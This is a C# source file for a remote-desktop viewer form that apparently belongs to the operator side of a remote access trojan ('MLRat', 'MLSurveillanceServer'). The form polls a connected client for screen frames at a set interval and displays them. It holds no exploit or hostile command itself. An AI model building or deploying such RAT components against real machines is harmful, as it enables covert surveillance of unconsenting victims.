using MLRat.Server;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLSurveillanceServer.Forms
{
    public partial class RemoteDesktopForm : Form
    {
        bool running = false;
        int delay = 1000;
        int monitorNum = -1;
        public IClient Client { get; private set; }
        public RemoteDesktopForm(IClient _client)
        {
            Client = _client;
            InitializeComponent();
        }

        private void RemoteDesktopForm_Load(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.GetMonitors);
        }

        public void UpdateMonitors(string[] monitors)
        {
            Invoke((MethodInvoker)delegate ()
            {
                cbMonitors.Items.Clear();
                cbMonitors.Items.AddRange(monitors);
                if (monitors.Length > 0)
                    cbMonitors.SelectedIndex = 0;
            });
        }

        public void Destroy()
        {
            Dispose();
        }

        public void SetImage(Image img)
        {
            Invoke((MethodInvoker)delegate ()
            {
                pbScreen.Image = img;
            });
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            monitorNum = cbMonitors.SelectedIndex;
            if (monitorNum < 0)
            {
                MessageBox.Show("No monitor selected.");
                return;
            }
            if (running)
                return;
            btnStop.Enabled = true;
            btnStart.Enabled = false;
            cbMonitors.Enabled = false;
            new Thread(RDThread).Start();
        }

        private void RDThread()
        {
            running = true;
            while (running)
            {
                Client.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.RequestFrame, monitorNum);
                Thread.Sleep(delay);
            }
            Invoke((MethodInvoker)delegate ()
            {
                btnStart.Enabled = true;
                btnStop.Enabled = false;
                cbMonitors.Enabled = true;
                btnStop.Text = "Stop";
            });
        }

        private void nudDelay_ValueChanged(object sender, EventArgs e)
        {
            delay = (int)nudDelay.Value;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            running = false;
            btnStop.Text = "Stopping...";
        }

        private void cbMonitors_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }
    }
}
